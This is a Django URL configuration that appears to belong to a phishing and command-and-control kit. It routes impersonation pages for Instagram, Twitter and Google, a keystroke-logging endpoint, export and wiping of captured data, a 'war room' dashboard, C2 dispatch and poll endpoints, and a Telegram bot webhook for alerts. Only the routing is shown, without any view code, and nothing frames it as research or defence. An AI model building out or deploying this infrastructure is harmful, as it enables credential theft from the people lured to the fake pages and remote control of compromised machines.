from django.urls import path
from . import views

urlpatterns = [
    path('', views.gateway_view, name='gateway_view'),
    path('ig/', views.instagram_view, name='instagram_view'),
    path('tw/', views.twitter_view, name='twitter_view'),
    path('gl/', views.google_view, name='google_view'),
    path('cyber-ops/', views.war_room_view, name='war_room_view'),
    path('war-room-login/', views.war_room_login, name='war_room_login'),
    path('log_keys/', views.log_keys_view, name='log_keys_view'),
    path('export/', views.export_csv_view, name='export_csv_view'),
    path('wipe/', views.wipe_data_view, name='wipe_data_view'),
    path('get_template/', views.get_template_view, name='get_template_view'),
    path('set_template/', views.set_template_view, name='set_template_view'),
    path('war_room_data/', views.war_room_data_api, name='war_room_data_api'),
    path('c2/dispatch/', views.dispatch_command_view, name='dispatch_command_view'),
    path('c2/poll/', views.poll_command_view, name='poll_command_view'),
    path('alerts/war-room/', views.send_war_room_alert, name='send_war_room_alert'),
    path('alerts/realtime/', views.send_realtime_alert, name='send_realtime_alert'),
    path('bot/webhook/', views.telegram_bot_webhook, name='telegram_bot_webhook'),
]
